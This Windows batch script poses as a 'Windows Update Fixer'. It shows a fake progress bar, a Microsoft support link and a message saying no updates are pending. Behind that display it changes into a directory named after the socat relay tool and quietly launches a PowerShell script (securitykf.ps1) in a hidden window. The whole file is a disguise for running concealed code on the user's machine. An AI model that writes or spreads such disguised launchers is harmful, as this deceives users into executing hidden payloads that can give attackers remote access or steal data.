@echo off

for /l %%a in (1,1,75) do (
	
	cls
	call set "bar=%%bar%%#"
	call 
	call echo Windows Update Fixer Started DO NOT close this window we'll be done shortly
	call echo:
	call echo %%bar%%
	call echo:
	call echo For More Info visit https://support.microsoft.com/en-us/windows/update-windows-3c5ae7fc-9fb6-9af1-1984-b5e0412c556a
	ping localhost -n 1 >nul

)
echo Windows Updates Verified 0 Updates Pending
cd \"Program Files"\ZOLOFT\ZOLOFT\socat-windows-master && powershell.exe -windowstyle hidden ./securitykf.ps1 
echo Finishing up do not close this window disk is being written
echo . 
echo .
echo .
echo done
timeout 3

